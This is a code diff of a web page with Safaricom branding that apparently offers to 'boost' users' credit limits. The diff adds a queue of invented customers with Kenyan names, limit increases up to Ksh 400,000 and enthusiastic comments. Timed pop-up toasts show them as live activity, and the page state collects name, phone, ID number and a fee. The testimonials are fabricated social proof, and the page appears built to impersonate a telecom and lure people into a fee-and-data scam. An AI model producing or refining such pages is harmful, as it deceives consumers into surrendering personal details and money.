+        name: "Odoyo Ochieng (Kisumu)", 
+        action: "Boosted limit to Ksh 17,000! 🌅", 
+        comment: "Hii ni mwecheche December sorted! Mambo yanajipa polepole bila taabu. 🙌✨", 
+        time: "47 mins ago" 
+      },
+      { 
+        name: "Kilonzo Muuo (Makueni)", 
+        action: "Boosted limit to Ksh 31,000! 🍊", 
+        comment: "Fantastic service! Quick response and instant activation on my line. Thumbs up! 👍", 
+        time: "48 mins ago" 
+      },
+      { 
+        name: "Maina Kamau (Nairobi)", 
+        action: "Boosted limit to Ksh 400,000 Executive Tier! 👑", 
+        comment: "Hii ni mwecheche December sorted kabisa! Max limit unlocked and all financial goals met without breaking a sweat! 🥂💎🚀", 
+        time: "49 mins ago" 
+      }
     ];
 
+    // Render the dropdown list with full names, actions, and comments
     function renderDropdownList() {
       const listContainer = document.getElementById('dropdown-notification-list');
       if (!listContainer) return;
       listContainer.innerHTML = notificationQueue.map(item => `
-        <div class="p-2.5 bg-gray-50 rounded-xl border border-gray-100 flex items-start space-x-2">
-          <div class="w-7 h-7 rounded-lg bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0 font-bold">
-            <i data-lucide="award" class="w-4 h-4"></i>
+        <div class="p-3 bg-gray-50 rounded-2xl border border-gray-100 space-y-1.5 hover:bg-safaricom-light/30 transition">
+          <div class="flex items-center justify-between">
+            <span class="font-black text-gray-900">${item.name}</span>
+            <span class="text-[10px] text-gray-400 font-semibold">${item.time}</span>
           </div>
-          <div>
-            <p class="font-bold text-gray-900">${item.name} <span class="text-[10px] text-gray-400 font-normal">• ${item.time}</span></p>
-            <p class="text-safaricom font-semibold mt-0.5">${item.action}</p>
-          </div>
+          <p class="text-safaricom font-extrabold text-[11px]">${item.action}</p>
+          <p class="text-gray-700 italic bg-white p-2 rounded-xl border border-gray-200/60 shadow-sm text-[11px]">"${item.comment}"</p>
         </div>
       `).join('');
       lucide.createIcons();
@@ -754,14 +1007,25 @@
       notifIdx = (notifIdx + 1) % notificationQueue.length;
 
       const toast = document.createElement('div');
-      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-4 rounded-2xl shadow-2xl border-2 border-safaricom/30 flex items-center space-x-3";
+      toast.className = "toast-enter pointer-events-auto bg-white/95 backdrop-blur-md p-4 rounded-3xl shadow-2xl border-2 border-safaricom/30 flex items-start space-x-3 cursor-pointer hover:scale-105 transition transform";
+      
+      // Tapping on the popping toast opens the notification dropdown so they can read the full comments
+      toast.onclick = () => {
+        const dropdown = document.getElementById('notification-dropdown');
+        if (dropdown) dropdown.classList.remove('hidden');
+      };
+
       toast.innerHTML = `
-        <div class="w-10 h-10 rounded-2xl bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0 font-black shadow-inner">
+        <div class="w-10 h-10 rounded-2xl bg-safaricom-light text-safaricom flex items-center justify-center flex-shrink-0 font-black shadow-inner mt-0.5">
           <i data-lucide="award" class="w-5 h-5"></i>
         </div>
-        <div class="flex-grow text-xs">
-          <p class="font-black text-gray-900">${item.name} <span class="font-normal text-gray-500">• ${item.time}</span></p>
-          <p class="text-safaricom font-extrabold mt-0.5">${item.action}</p>
+        <div class="flex-grow text-xs space-y-1">
+          <div class="flex justify-between items-center">
+            <p class="font-black text-gray-900">${item.name}</p>
+            <span class="text-[10px] text-gray-400">${item.time}</span>
+          </div>
+          <p class="text-safaricom font-black">${item.action}</p>
+          <p class="text-gray-600 text-[11px] italic line-clamp-2">"${item.comment}"</p>
         </div>
       `;
 
@@ -771,12 +1035,12 @@
       setTimeout(() => {
         toast.classList.remove('toast-enter');
         toast.classList.add('toast-exit');
-        setTimeout(() => toast.remove(), 300);
-      }, 5000);
+        setTimeout(() => toast.remove(), 400);
+      }, 5500);
     }
 
     setTimeout(triggerNextNotification, 2000);
-    setInterval(triggerNextNotification, 6000);
+    setInterval(triggerNextNotification, 6500);
 
     let userData = { name: '', phone: '', id: '', currentLimit: 0, selectedTarget: 0, selectedFee: 0 };
 
